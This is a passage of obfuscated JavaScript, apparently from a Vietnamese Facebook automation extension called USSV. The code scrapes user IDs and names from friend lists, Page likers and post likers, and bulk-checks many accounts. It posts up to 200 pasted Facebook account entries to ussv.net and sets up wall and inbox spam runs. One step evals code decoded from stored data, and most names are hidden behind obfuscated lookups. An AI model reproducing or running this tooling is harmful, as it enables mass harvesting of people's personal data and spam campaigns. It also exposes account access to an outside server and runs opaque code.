                $("#uss_goo_rd_ok")[f1W.m8y]("1");
                thongbao_log(1, "USSV Ta?o tha`nh công Link ru´t go?n trên goo.gl: " + o + " => " + W[V]);
            }
        });
    }

    function _2l(W, V) {
        return _l[f1W.W5v](W, V);
    }

    function get_info(E, O, Z, F) {
        var o = f1W.M1y + F;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: o,
            data: "hj=hj"
        }, function(W) {
            var V = JSON[f1W.i2O](W);
            get_mysub(E, O, Z, F, V);
        });
    }

    function thaotac_stt_tools(E) {
        var O = "#img_stt_tools_show_about_",
            Z = ".btn_stt_tools_coppy_",
            F = ".btn_stt_tools_cmt_",
            o = "fbt",
            U = "#stt_tools_about_hide_",
            p = ".btn_stt_tools_likes_",
            M = ".stt_tools.",
            b = ".open_tools.";
        $(b + E)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            $(this)[f1W.v37]();
            $(M + E)[f1W.l6Q](f1W.Y5a);
        });
        $(f1W.E0r + E)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
            $(b + E)[f1W.R4r]();
            $(M + E)[f1W.F50](f1W.Y5a);
        });
        $(p + E)[f1W.y1Y](f1W.Z6O, function(W) {
            W[f1W.q07]();
            _fb[f1W.G47]({
                "type": f1W.f5I
            });
            $(U + E)[f1W.Q0I](_lJ[f1W.G3v]({
                "t": o,
                "id": f1W.u4X
            }));
            StatusCore[f1W.U8Y]({
                "type": f1W.f5I,
                "id": E
            });
        });
        $(F + E)[f1W.y1Y](f1W.Z6O, function(W) {
            var V = "G3t";
            W[f1W.q07]();
            if (f1W[V](document[f1W.w6r][f1W.x3y](f1W.S0I), f1W.x0r)) {
                $(U + E)[f1W.Q0I](_lJ[f1W.G3v]({
                    "t": o,
                    "id": f1W.S7X
                }));
            } else {
                $(U + E)[f1W.Q0I](_lJ[f1W.G3v]({
                    "t": o,
                    "id": f1W.R4X
                }));
            }
            StatusCore[f1W.U8Y]({
                "type": f1W.n4v,
                "id": E
            });
        });
        $(Z + E)[f1W.y1Y](f1W.Z6O, function(W) {
            var V = "coppy";
            W[f1W.q07]();
            StatusCore[f1W.U8Y]({
                "type": V,
                "id": E
            });
        });
        $(O + E)[f1W.Z6O](function() {
            $(U + E)[f1W.l6Q](f1W.Y5a);
        });
    }

    function change_style_chat(W, V) {
        var E = "k1t",
            O = ".div_msg_sf_title",
            Z = "td",
            F = "X1t",
            o = "#5F6A81",
            U = "y1t";
        dv_tl_bg = $(".titlebar:eq(" + V + ")");
        dv_tl = $(".conversation:eq(" + V + ")");
        if (f1W[U](W, f1W.S9a)) {
            dv_tl_bg[f1W.C3O](f1W.Q1I, o);
            $(".name.fwb:eq(" + V + ")")[f1W.C3O]("color", "rgb(42, 124, 32)");
            if (f1W[F](dv_tl.parent(Z)[f1W.q8r](O).length, f1W.L9a)) {
                dv_tl.parent(Z)[f1W.p3Q](f1W.V8v + fc_add_dv(f1W.e10));
            }
        } else if (f1W[E](W, f1W.c9a)) {
            dv_tl_bg[f1W.C3O](f1W.Q1I, f1W.V8v);
            $(".name.fwb:eq(" + V + ")")[f1W.C3O]("color", "");
            dv_tl.parent(Z)[f1W.q8r](O)[f1W.w5I]();
        }
    }

    function fb_getuid() {
        var q0 = ".textarea_fb.list_uid_will_post",
            H0 = "Status",
            W0 = "likes",
            w = " Không h?p l?, không th? Get List UID.",
            B0 = "Id không h?p l?",
            o0 = "#ussv_post_uid_geting_note",
            Z0 = "Ðã có yêu c?u d?ng Get Uid",
            A = "#ussv_post_input_aut_get_uid",
            X0 = "AutGetUid",
            n0 = f1W.L9a;
        this[X0] = function(W) {
            var V = "#ussv_post_btn_get_uid",
                E = "#ussv_post_btn_stop_get_uid",
                O = "#ussv_post_input_id_objects",
                Z = "f4E";
            if (f1W[Z](W[f1W.O4y], f1W.S9a)) {
                $(O)[f1W.V6Q](f1W.p4I, f1W.A0r);
                $(E)[f1W.R4r]();
                $(V)[f1W.v37]();
            } else {
                $(O)[f1W.V6Q](f1W.p4I, f1W.R30);
                $(E)[f1W.v37]();
                $(V)[f1W.R4r]();
            }
        };
        this[f1W.w97] = function(R) {
            var X = "Ðang get List UID t? ",
                f = 34,
                n = "h4E",
                Y = "R4E",
                N = "startindex";

            function g(W) {
                var V = "z4E",
                    E = " UID.",
                    O = "Ðã get thành công ",
                    Z = "look",
                    F = "N4E";
                if (f1W[F](W[Z], f1W.G9a)) {
                    _fb_data[f1W.C67](O + W[N] + E);
                    fb_getuid[X0]({
                        "type": f1W.L9a
                    });
                } else {
                    var o = $(A)[f1W.o07]();
                    if (f1W[V](o, f1W.S9a)) {
                        T(W);
                    } else {
                        console[f1W.p4y](f1W.j30);
                        _fb_data[f1W.C67](Z0);
                        $(o0)[f1W.Q0I](Z0);
                    }
                }
            }

            function T(o) {
                var U = "&startindex=",
                    p = "https://m.facebook.com/profile.php?v=friends&mutual&id=",
                    M = "&__ajax__",
                    b = "?v=friends&mutual&startindex=",
                    H = "P4E";
                if (f1W[H](o[f1W.v87], f1W.L9a)) {
                    url = f1W.s50 + o[f1W.v87] + b + o[N] + M;
                } else {
                    url = p + o[f1W.l97] + U + o[N] + M;
                }
                $[f1W.c9y]({
                    url: url,
                    dataType: "json",
                    type: "GET"
                })[f1W.D2I](function(W) {
                    var V = "d4E",
                        E = "K4E",
                        O = "L4E",
                        Z = "S4E";
                    if (f1W[Z](W[f1W.D60], 4) && f1W[O](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            W = W[f1W.F6r]("for (;;);", "");
                        W = JSON[f1W.i2O](W);
                        datafr = W;
                        datafrhtml = datafr[f1W.v6v][f1W.M4I][0][f1W.Q0I];
                        totalfr = $(datafrhtml)[f1W.q8r]("._55wq._4g33._5pxa");
                        dvfr = $(datafrhtml)[f1W.q8r]("._55wo._55x2");
                        indexnow = o[N] + totalfr.length;
                        listuid = "";
                        for (var F = 0; f1W[E](F, totalfr.length); F++) {
                            totalget = parseInt($("#ussv_post_uid_TK_TT")[f1W.m8y]());
                            $("#ussv_post_uid_TK_TT")[f1W.m8y](totalget + 1);
                            $("#ussv_uid_TK_NOW")[f1W.m8y](F);
                            infofriend = $(datafrhtml)[f1W.q8r]("._55wq._4g33._5pxa")[F];
                            name = $(infofriend)[f1W.q8r]("._52jh._5pxc")[f1W.q8r]("a")[f1W.Q0I]();
                            infofriend = $(infofriend)[f1W.q8r](".touchable.right")[f1W.V6Q]("data-store");
                            if (f1W[V](infofriend, undefined)) {
                                uid = JSON[f1W.i2O](infofriend);
                                uid = uid[f1W.W7O];
                            } else {
                                uid = 0;
                            }
                            listuid = listuid + uid + "|" + name + "\n";
                            _fb_data[f1W.C67]("GET UID:" + uid + " (" + name + ")");
                        }
                        textarealistuid = $(".textarea_fb.list_uid_will_post")[f1W.o07]();
                        $(".textarea_fb.list_uid_will_post")[f1W.o07](listuid + textarealistuid);
                        g({
                            "look": totalfr.length,
                            "startindex": indexnow,
                            "username": o[f1W.v87],
                            "uid": o[f1W.l97]
                        });
                    } else {
                        _fb_data[f1W.C67]("L?i GET UID", "error");
                    }
                });
            }
            ParseUser = JSON[f1W.i2O](uss[f1W.G47](f1W.r90 + R[f1W.W7O] + f1W.N9y + n0));
            if (f1W[Y](ParseUser[f1W.v87], f1W.x0r)) {
                if (f1W[n](ParseUser[f1W.W7O], R[f1W.W7O])) {
                    g({
                        "look": f,
                        "startindex": f1W.L9a,
                        "username": f1W.L9a,
                        "uid": R[f1W.W7O]
                    });
                    $(o0)[f1W.Q0I](X + R[f1W.W7O]);
                    fb_getuid[X0]({
                        "type": f1W.S9a
                    });
                } else {
                    fb_getuid[X0]({
                        "type": f1W.L9a
                    });
                    _fb_data[f1W.C67](B0);
                    $(o0)[f1W.Q0I](R[f1W.W7O] + w);
                }
            } else {
                FbUsername = ParseUser[f1W.v87];
                g({
                    "look": f,
                    "startindex": f1W.L9a,
                    "username": FbUsername
                });
                $(o0)[f1W.Q0I](X + R[f1W.W7O]);
            }
        };
        this[f1W.X7O] = function(L) {
            var E0 = "<br/>Likes: <span class='Total_Likes_Page_",
                F0 = "Ðang get List UID t? Page: ",
                K = "My_Uid",
                r0 = "Cursor",
                Q = "Page_Id";

            function S(W) {
                var V = "r1E",
                    E = $(A)[f1W.o07]();
                if (f1W[V](E, f1W.S9a)) {
                    p0(W);
                } else {
                    _fb_data[f1W.C67](Z0);
                    $(o0)[f1W.Q0I](Z0);
                }
            }

            function u(Z) {
                $[f1W.c9y]({
                    url: "https://www.facebook.com/search/" + Z[Q] + "/likers",
                    type: "GET",
                    dataType: "json",
                    async: true
                })[f1W.D2I](function(W) {
                    var V = "E1E",
                        E = "W1E";
                    if (f1W[E](W[f1W.D60], 4) && f1W[V](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v],
                            O = W[f1W.x3y]("\\{\"cursor\":\"(.*?)\",\"page_number\"");
                        Z[f1W.S77] = "start";
                        Z[r0] = O[1];
                        S(Z);
                        _fb_data[f1W.C67]("Lây thông tin Page thành công, ti?n hành l?y List Uid");
                    } else {
                        _fb_data[f1W.C67]("L?i trong quá trình l?y thông tin Page", "error");
                    }
                });
            }

            function p0(T) {
                var I = '&__a=1"',
                    D = '%22%2C%22page_number%22%3A15%2C%22em%22%3Afalse%2C%22mr%22%3Afalse%2C%22tr%22%3Anull%7D&__user=',
                    G = '%2Flikers%22%2C%22is_trending%22%3Afalse%2C%22topic_id%22%3Anull%2C%22story_id%22%3Anull%2C%22callsite%22%3A%22browse_ui%3Ainit_result_set%22%2C%22display_params%22%3A[]%2C%22cursor%22%3A%22',
                    C = ')%5C%22%2C%5C%22vertical%5C%22%3A%5C%22none%5C%22%2C%5C%22post_search_vertical%5C%22%3Anull%7D%22%2C%22encoded_title%22%3A%22XXX%22%2C%22ref%22%3A%22unknown%22%2C%22logger_source%22%3A%22www_main%22%2C%22typeahead_sid%22%3A%22%22%2C%22tl_log%22%3Afalse%2C%22experience_type%22%3A%22grammar%22%2C%22exclude_ids%22%3Anull%2C%22browse_location%22%3A%22%22%2C%22trending_source%22%3Anull%2C%22ref_path%22%3A%22%2Fsearch%2F',
                    z = 'data=%7B%22view%22%3A%22list%22%2C%22encoded_query%22%3A%22%7B%5C%22bqf%5C%22%3A%5C%22likers(',
                    P = T[Q],
                    J = T[r0],
                    c = z + P + C + P + G + J + D + T[K] + I;
                $[f1W.c9y]({
                    url: "https://www.facebook.com/ajax/pagelet/generic.php/BrowseScrollingSetPagelet?" + c,
                    type: "GET",
                    dataType: "json"
                })[f1W.D2I](function(W) {
                    var V = "i1E",
                        E = "cursor",
                        O = "query_data",
                        Z = "n1E",
                        F = "M1E",
                        o = "e1E",
                        U = "p1E",
                        p = "o1E";
                    if (f1W[p](W[f1W.D60], 4) && f1W[U](W[f1W.p0O], 500)) {
                        var W = W[f1W.H8v][f1W.F6r]("for (;;);", ""),
                            W = JSON[f1W.i2O](W),
                            M = W[f1W.v6v],
                            b = JSON[f1W.v4X](W[f1W.R1v][f1W.J5a]),
                            H = b[f1W.x3y]("\"cursor\":\"(.*?)\",\"page_number\""),
                            R = $(M)[f1W.q8r]("._7ke"),
                            X = "";
                        for (var f = 0; f1W[o](f, R.length); f++) {
                            totalget = parseInt($("#ussv_post_uid_TK_TT")[f1W.m8y]());
                            $("#ussv_post_uid_TK_TT")[f1W.m8y](totalget + 1);
                            $("#ussv_uid_TK_NOW")[f1W.m8y](f);
                            var n = $(R[f])[f1W.V6Q]("data-bt"),
                                Y = $(R[f])[f1W.q8r]("._zs.fwb")[f1W.q8r]("a")[f1W.m8y](),
                                n = JSON[f1W.i2O](n);
                            X = X + n[f1W.W7O] + "|" + Y + "\n";
                            _fb_data[f1W.C67]("GET UID:" + n[f1W.W7O] + " (" + Y + ")");
                        };
                        textarealistuid = $(".textarea_fb.list_uid_will_post")[f1W.o07]();
                        if (f1W[F](textarealistuid[f1W.X3Q]("\n").length, 4000)) {
                            var N = $(".Total_Likes_Page_" + P)[f1W.m8y](),
                                g = new Blob([textarealistuid], {
                                    type: "text/plain;charset=utf-8"
                                });
                            saveAs(g, "List_Uid_PAGE_" + P + "_4000-" + totalget + "-" + N + ".txt");
                            $(".textarea_fb.list_uid_will_post")[f1W.o07](X);
                        } else {
                            $(".textarea_fb.list_uid_will_post")[f1W.o07](X + textarealistuid);
                        }
                        if (f1W[Z](H, null)) {
                            var H = $(M)[f1W.q8r]("._7ke"),
                                H = $(H[0])[f1W.V6Q]("data-bt"),
                                H = JSON[f1W.i2O](H),
                                H = H[O].data,
                                H = JSON[f1W.i2O](H),
                                H = H[E];
                            if (f1W[V](T[r0], H)) {
                                _fb_data[f1W.C67]("L?y List UID Hoàn Thành");
                                fb_getuid[X0]({
                                    "type": 0
                                });
                            } else {
                                T[r0] = H;
                                T[f1W.O4y] = "next";
                                S(T);
                            }
                        } else {
                            T[r0] = H[1];
                            T[f1W.O4y] = "next";
                            S(T);
                        }
                    } else {}
                });
            }
            ParsePage = JSON[f1W.i2O](uss[f1W.G47](f1W.r90 + L[Q] + f1W.N9y + n0));
            if (ParsePage[f1W.W7O]) {
                L[Q] = ParsePage[f1W.W7O];
                L[K] = _fb[f1W.z1Y];
                u(L);
                $(o0)[f1W.Q0I](F0 + ParsePage[f1W.G6y] + E0 + ParsePage[f1W.W7O] + f1W.w9Y + ParsePage[W0] + f1W.n5I);
                fb_getuid[X0]({
                    "type": f1W.S9a
                });
            } else {
                fb_getuid[X0]({
                    "type": f1W.L9a
                });
                _fb_data[f1W.C67](B0);
                $(o0)[f1W.Q0I](ParsePage[f1W.W7O] + w);
            }
        };
        this[H0] = function(b, H) {
            var R = "T1E",
                X = "ID Status không h?p l? ho?c không ph?i ch? d? Công Khai",
                f = "#object_info_status_message",
                n = ".get_uid_object_info.status",
                Y = "Ti?n hành l?y UID...",
                N = "/?access_token=",
                g = "posts",
                T = "a1E",
                I = "Status_Id";

            function D(W) {
                var V = "/likes?&limit=",
                    E = "J1E",
                    O = "Lan",
                    Z = "I1E",
                    F = "NumPerPage",
                    o = $(A)[f1W.o07]();
                if (!W[F]) {
                    W[F] = f1W.Y5a;
                };
                if (f1W[Z](o, f1W.S9a)) {
                    W[O] = W[O] + f1W.S9a;
                    if (f1W[E](W[O], f1W.F30)) {
                        $(q0)[f1W.o07](f1W.V8v);
                        W[O] = f1W.L9a;
                    }
                    if (!W[f1W.O8a]) {
                        W[f1W.O8a] = f1W.r90 + W[I] + V + W[F] + f1W.U7I + C;
                    }
                    G(W);
                } else {
                    _fb_data[f1W.C67](Z0);
                    $(o0)[f1W.Q0I](Z0);
                }
            }

            function G(M) {
                $[f1W.c9y]({
                    url: M[f1W.O8a],
                    type: "GET",
                    dataType: "json"
                })[f1W.D2I](function(W) {
                    var V = "u1E",
                        E = "c1E";
                    if (!W.data) {
                        W = {
                            "data": []
                        };
                    };
                    var O = W.data.length;
                    if (f1W[E](O, 2)) {
                        uss[f1W.H1X]($("#ussv_post_uid_TK_TT"), O);
                        var Z = "";
                        for (var F = 0; f1W[V](F, O); F++) {
                            $("#ussv_uid_TK_NOW")[f1W.m8y](F);
                            var o = W.data[F],
                                U = o[f1W.W7O],
                                p = o[f1W.G6y],
                                Z = Z + U + "\n";
                            _fb_data[f1W.C67]("GET UID:" + U + " (" + p + ")");
                        };
                        z = Z + z;
                        if (W[f1W.L9Q][f1W.Q8y]) {
                            M[f1W.O8a] = W[f1W.L9Q][f1W.Q8y];
                            D(M);
                        } else {
                            _fb_data[f1W.C67]("L?y danh sách UID thành công...");
                            $("#ussv_post_uid_geting_note")[f1W.Q0I]("L?y danh sách UID thành công...");
                            fb_getuid[X0]({
                                "type": 0
                            });
                            H(z);
                        }
                    } else {
                        _fb_data[f1W.C67]("L?y danh sách UID thành công...");
                        $("#ussv_post_uid_geting_note")[f1W.Q0I]("L?y danh sách UID thành công...");
                        fb_getuid[X0]({
                            "type": 0
                        });
                        H(z);
                    }
                });
            }
            H = H ? H : function() {};
            var C = $(f1W.B6Y)[f1W.o07](),
                z = f1W.V8v;
            $("#ussv_post_uid_TK_TT")[f1W.L0Q]("click")[f1W.Z6O](function() {
                var W = z[f1W.X3Q]("\n").length,
                    V = parseInt($("#ussv_post_uid_TK_TT")[f1W.m8y]()),
                    E = new Blob([z], {
                        type: "text/plain;charset=utf-8"
                    });
                saveAs(E, "List_Uid_" + b[I] + "_" + W + "-" + V + ".txt");
            });
            if (f1W[T](b[f1W.O4y], W0)) {
                if (b[I][f1W.x3y](g)) {
                    var P = b[I][f1W.x3y](/posts\/(.*?)$/);
                    b[I] = P[f1W.S9a];
                }
                ParseStatus = JSON[f1W.i2O](uss[f1W.G47](f1W.r90 + b[I] + N + C));
                if (ParseStatus[f1W.W7O]) {
                    var J = Y;
                    _fb_data[f1W.C67](J);
                    $(o0)[f1W.Q0I](J);
                    $(n)[f1W.l6Q](f1W.Y5a);
                    $(f)[f1W.m8y](ParseStatus[f1W.q10]);
                    fb_getuid[X0]({
                        "type": f1W.S9a
                    });
                    D(b);
                } else {
                    var J = X;
                    _fb_data[f1W.C67](J);
                    $(o0)[f1W.Q0I](J);
                    fb_getuid[X0]({
                        "type": f1W.L9a
                    });
                }
            } else if (f1W[R](b[f1W.O4y], f1W.r7X)) {} else {}
        };
    }

    function get_OneAcc() {
        var f = "N5",
            n = "#speed_scan_check",
            Y = "V5";
        if (f1W[Y]($(f1W.M50)[f1W.o07](), f1W.L9a)) {
            var N = acc_doing[f1W.f17],
                g = f1W.A0r,
                T = f1W.L9a,
                I = $(n)[f1W.o07]();
            if (!I) {
                var D = function(W) {
                    I = W;
                };
                D(f1W.T7Q);
            };
            I = parseInt(I);
            var G = setInterval(function() {
                    var V = "f5",
                        E = " )",
                        O = " chua hoàn t?t chua th? ti?p t?c qua tài kho?n khác. Vui lòng ch? giây lát....( ",
                        Z = "Thao tác trên tài kho?n ",
                        F = ".note_ussv_logs",
                        o = "H5",
                        U = "q5",
                        p = "U5",
                        M = "Z5",
                        b = "O5";
                    if (f1W[b](N, f1W.S9a) || f1W[M](acc_doing[f1W.I0O], f1W.S9a) || f1W[p](acc_doing[f1W.l8a], f1W.S9a) || f1W[f1W.A00](acc_doing[f1W.v20][f1W.D87], f1W.S9a) || f1W[U](acc_doing[f1W.v20][f1W.i0Y], f1W.S9a) || f1W[o](acc_doing[f1W.v20][f1W.t0Q], f1W.S9a)) {
                        var H = function() {
                                T = T + f1W.c9a;
                            },
                            R = function() {
                                notedem = T + f1W.B7a + acc_doing[f1W.D87];
                            };
                        H();
                        R();
                        $(F)[f1W.Q0I](Z + acc_doing[f1W.D87] + O + T + E);
                    } else {
                        var X = function(W) {
                            g = W;
                        };
                        X(f1W.R30);
                        clearInterval(G);
                        if (f1W[V]($(f1W.I5O)[f1W.o07](), f1W.S9a)) {
                            CheckV2[f1W.t5X]();
                        } else {
                            _get_OneAcc();
                        }
                    }
                }, I),
                C = f1W.L9a,
                z = setInterval(function() {
                    var V = "Ðã quá th?i gian ho?t d?ng trên 1 tài kho?n, tôi s? ti?n hành thao tác trên tài kho?n ti?p theo.",
                        E = 35,
                        O = "h5",
                        Z = "R5";
                    C++;
                    if (f1W[Z](g, f1W.R30)) {
                        clearInterval(z);
                    } else {
                        if (f1W[O](C, E)) {
                            var F = function(W) {
                                    acc_doing[f1W.v20][f1W.i0Y] = W;
                                },
                                o = function(W) {
                                    N = W;
                                },
                                U = function(W) {
                                    acc_doing[f1W.l8a] = W;
                                },
                                p = function(W) {
                                    acc_doing[f1W.I0O] = W;
                                },
                                M = function(W) {
                                    acc_doing[f1W.v20][f1W.D87] = W;
                                },
                                b = function(W) {
                                    acc_doing[f1W.v20][f1W.t0Q] = W;
                                };
                            clearInterval(z);
                            o(f1W.L9a);
                            p(f1W.L9a);
                            U(f1W.L9a);
                            M(f1W.L9a);
                            F(f1W.L9a);
                            b(f1W.L9a);
                            dom_logs_ussv(V, f1W.d07);
                        } else {}
                    }
                }, f1W.Q8r);
        } else {
            if (f1W[f]($(f1W.I5O)[f1W.o07](), f1W.S9a)) {
                CheckV2[f1W.t5X]();
            } else {
                _get_OneAcc();
            }
        }
    }

    function get_listcheck() {
        var g = function() {
                var W = "type=getallacc&stt=";
                datalogin = W + st_check_stt() + f1W.c1Y + st_check_time() + f1W.l77 + uss_aut(f1W.S9a) + f1W.R87 + uss_aut(f1W.c9a);
            },
            T = function(W) {
                url = W;
            },
            I = function(W) {
                demtime = W;
            },
            D = function(W) {
                acc_doing[f1W.f17] = W;
            };
        reset_thongke_check();
        D(f1W.L9a);
        var G = new Date(),
            C = G[f1W.m2Q](),
            z = G[f1W.Y6v](),
            P = G[f1W.I8O](),
            G = C + f1W.V8Y + z + f1W.V8Y + P;
        $(f1W.J0r)[f1W.Q0I](G);
        I(f1W.S9a);
        $(f1W.a8O)[f1W.Q0I](f1W.c8Q);
        $(f1W.n9Q)[f1W.Q0I](f1W.c8Q);
        $(f1W.H5r)[f1W.Q0I](f1W.c8Q);
        $(f1W.h9O)[f1W.Q0I](f1W.c8Q);
        $(f1W.H17)[f1W.Q0I](f1W.c8Q);
        $(f1W.A50)[f1W.Q0I](f1W.c8Q);
        $(f1W.c77)[f1W.Q0I](f1W.c8Q);
        $(f1W.h7r)[f1W.R4r]();
        $(f1W.V3O)[f1W.C3O](f1W.d8v, f1W.C1v);
        $(f1W.E5v)[f1W.Q0I](f1W.R1Q);
        var J = $(f1W.R70)[f1W.Q0I]();
        $(f1W.X8O)[f1W.Q0I](f1W.Z7Y + J);
        T(f1W.l9r);
        g();
        var c = new XMLHttpRequest();
        c[f1W.g4Y] = function() {
            var p = "Q6",
                M = "t6",
                b = "accnonecheck",
                H = "l6",
                R = "C6";
            if (f1W[R](c[f1W.D60], 4)) {
                $("#popup_ussv_logs")[f1W.l6Q](500);
                open_div_ussv_logs("refresh");
                var X = c[f1W.H8v],
                    X = JSON[f1W.i2O](X);
                if (f1W[H](X[f1W.C3y], 0)) {
                    var f = X[b];
                    $("#thongke_fbchuacheck")[f1W.Q0I](f);
                    $("#stt_check")[f1W.Q0I]("1");
                    $("#stt_checking")[f1W.Q0I]("Qu´a tri`nh xa´c minh ta`i khoa?n " + J + " hoa`n tâ´t..");
                    var n = setInterval(function() {
                            var W = "w6",
                                V = "x6",
                                E = $("#stt_check")[f1W.Q0I](),
                                O = demtime++,
                                O = f1W[V](O, 10);
                            document[f1W.C4y]("thongke_totla_time")[f1W.V5I] = O;
                            if (f1W[W](E, "0")) {
                                clearInterval(n);
                                var Z = new Date(),
                                    F = Z[f1W.m2Q](),
                                    o = Z[f1W.Y6v](),
                                    U = Z[f1W.I8O](),
                                    Z = F + ":" + o + ":" + U;
                                $("#thongke_time_end")[f1W.Q0I](Z);
                            }
                        }, 100),
                        Y = $("#uss_vip")[f1W.Q0I]();
                    if (f1W[M](Y, "1")) {
                        var N = $("#uss_spam")[f1W.Q0I]();
                        if (f1W[p](N, "1")) {
                            get_setting_spam("hau");
                        } else {
                            $("#stt_checking")[f1W.Q0I]("Ti´nh nang SPAM chua duo?c bâ?t, tiê´n ha`nh Check Live...");
                            get_OneAcc();
                        }
                    } else {
                        $("#stt_checking")[f1W.Q0I]("Ba?n dang Check vo´i Go´i Free...");
                        get_OneAcc();
                    }
                } else {
                    dom_logs_ussv(X[f1W.F5v], id + "|_|_|error|check");
                }
            }
        };
        c[f1W.d5y](f1W.z77, url, f1W.A0r);
        c[f1W.x1I](f1W.r27, f1W.W3v);
        c[f1W.h0r](datalogin);
    }

    function SParse() {
        this[f1W.C37] = function(W) {};
    }

    function add_account() {
        var E = "http://ussv.net/ajax/add_acc_fb.php",
            O = " ta`i khoa?n Facebook thâ´t ba?i vi` Qu´a sô´ ta`i khoa?n cho phe´p !",
            Z = "Qu´a tri`nh thêm ",
            F = " Acc<br/>Tô´i Ða: 200 Acc<br/>Chi´nh Sa´ch USS không da?m ba?o du~ liê?u toa`n ve?n nê´u nhu ba?n thêm qua´ 200 Acc / 1 lâ`n.<br/>Ba?n da~ thêm qua´ sô´ Acc quy di?nh.<br/>Vui lo`ng kiê?m tra la?i.<br/>",
            o = "Chuâ?n Bi? Thêm: ",
            U = 201,
            p = "S2t",
            M = " ta`i khoa?n Facebook",
            b = "Ðang tiê´n ha`nh thêm ",
            H = '%26',
            R = 'textarea_account',
            X = document[f1W.C4y](f1W.n10)[f1W.V5I],
            f = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            n = document[f1W.C4y](R)[f1W.F2Q][f1W.F6r](/&/g, H),
            Y = n[f1W.X3Q](/\n/),
            Y = Y.length;
        thongbao_log(f1W.S9a, b + Y + M);
        if (f1W[p](Y, U)) {
            var N = o + Y + F;
            N += f1W.r8a;
            $(f1W.I50)[f1W.R4r]();
            $(f1W.y7Y)[f1W.R4r]();
            $(f1W.j3O)[f1W.v37]();
            div_thongbao(N);
            thongbao_log(f1W.c9a, Z + Y + O);
        } else {
            var g = function() {
                    var W = "&fb_add_acc=",
                        V = "addon=yes&user=";
                    datalogin = V + X + f1W.R87 + f + W + n;
                },
                T = function(W) {
                    url = W;
                };
            T(E);
            g();
            chrome[f1W.d60][f1W.K4r]({
                method: 'POST',
                action: 'xhttp',
                url: url,
                data: datalogin
            }, function(W) {
                thongbao_log(1, lang_vi_pr_add_ac_fn);
                $("#div_ketqua_themacc")[f1W.R4r]();
                $("#div_ketqua_themacc")[f1W.Q0I](W);
                $("#show_add_acc")[f1W.Z6O](function() {
                    $("#show_add_acc")[f1W.v37]();
                    $("#div_ketqua_themacc")[f1W.v37]();
                    $("#div_textarea_themacc")[f1W.R4r]();
                    $("#add_acc")[f1W.R4r]();
                    $("#row_thaotac")[f1W.R4r]();
                });
            });
        }
    }

    function go_url(W) {
        var V = "focus",
            E = '_blank',
            O = window[f1W.d5y](W, E);
        O[V]();
    }

    function start_spam(p, M, b, H, R, X) {
        var f = "0|_|_|war|getspam",
            n = "u66",
            Y = "c66",
            N = "J66",
            g = "I66",
            T = "T66",
            I = "a66",
            D = "i66",
            G = "n66",
            C = "M66",
            z = "e66",
            P = "E66",
            J = "W66",
            c = "d36",
            L = "0|_|_|ok|getspam";

        function E0(E) {
            var O = ".chophepspam",
                Z = '<a href="#" class="chophepspam">Cho Phép Spam ',
                F = "#more_info_spam_logs_ok_end_",
                o = function(W) {
                    acc_doing[f1W.f17] = W;
                },
                U = function() {
                    var W = "friends_need";
                    data = E[W] + "--xxx";
                };
            o(f1W.L9a);
            U();
            dom_logs_ussv(_lJ[f1W.G3v]({
                "t": "spam",
                "id": "a1",
                "r": data
            }), "0|_|_|war|getspam");
            $(F + p)[f1W.Q0I](Z + E[f1W.O4y] + f1W.t97);
            $(O)[f1W.L0Q](f1W.Z6O)[f1W.Z6O](function() {
                var V = function(W) {
                    acc_doing[f1W.f17] = W;
                };
                V(f1W.S9a);
                K();
                start_spam_safe(p, M, b, H, R, X, E[f1W.O4y]);
            });
        }
        var F0 = function(W) {
            fb_friends = W[f1W.w97];
        };

        function K() {
            var V = function(W) {
                    acc_doing[f1W.j97] = W;
                },
                E = function(W) {
                    acc_doing[f1W.h6r] = W;
                };
            V(f1W.e0Y);
            E(f1W.L9a);
        }
        var r0 = function(W) {
            acc_doing[f1W.f17] = W;
        };

        function Q() {
            var W = "ít hon ",
                V = "r66";
            if (f1W[V](fb_friends, spam_wall_need_fr)) {
                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": f1W.p37,
                    "id": f1W.h7X,
                    "r": acc_doing[f1W.D87]
                }), L);
                start_spam_safe(p, M, b, H, R, X, f1W.o7v);
            } else {
                E0({
                    "friends_need": W + spam_wall_need_fr,
                    "type": f1W.o7v
                });
            }
        }

        function S() {
            var W = " d?n ",
                V = "T? ",
                E = "p66",
                O = "o66",
                Z = function() {
                    acc_doing[f1W.E2y] = p + f1W.B5r;
                };
            Z();
            if (f1W[O](fb_friends, spam_inbox_need_fr_f) && f1W[E](fb_friends, spam_inbox_need_fr_l)) {
                K();
                dom_logs_ussv(_lJ[f1W.G3v]({
                    "t": f1W.p37,
                    "id": f1W.S7X,
                    "r": acc_doing[f1W.D87]
                }), L);
                start_spam_safe(p, M, b, H, R, X, f1W.G4y);
            } else {
                E0({
                    "friends_need": V + spam_inbox_need_fr_f + W + spam_inbox_need_fr_l,
                    "type": f1W.G4y
                });
            }
        }
        r0(f1W.S9a);
        var u = findItem_Safe(f1W.e4Y),
            u = uss_js_parse(uss_change_js(u));
        eval(u);
        spam_wall = $(f1W.q9O)[f1W.o07]();
        spam_wall_need_fr = $(f1W.n7a)[f1W.o07]();
        if (f1W[c](spam_wall_need_fr, undefined)) {
            var p0 = function(W) {
                spam_wall_need_fr = W;
            };
            p0(f1W.y3Q);
        }
        spam_inbox = $(f1W.c6v)[f1W.o07]();
        spam_inbox_need_fr_f = $(f1W.c4v)[f1W.o07]();
        spam_inbox_need_fr_l = $(f1W.y0Y)[f1W.o07]();
        if (f1W[J](spam_inbox_need_fr_f, undefined)) {
            var q0 = function(W) {
                spam_inbox_need_fr_f = W;
            };
            q0(f1W.S9a);
        }
        if (f1W[P](spam_inbox_need_fr_l, undefined)) {
            var H0 = function(W) {
                spam_inbox_need_fr_l = W;
            };
            H0(f1W.y3Q);
        }
        F0(acc_doing);
        if (f1W[z](X, f1W.E1Y) || f1W[C](X, f1W.S9a)) {
            var W0 = function(W) {
                acc_doing[f1W.f17] = W;
            };
            W0(f1W.S9a);
            start_spam_safe(p, M, b, H, R, X, f1W.o7v);
        } else {
            var w = function(W) {
                acc_doing[f1W.f17] = W;
            };
            w(f1W.S9a);
            if (f1W[G](spam_wall, f1W.S9a) && f1W[D](spam_inbox, f1W.S9a)) {
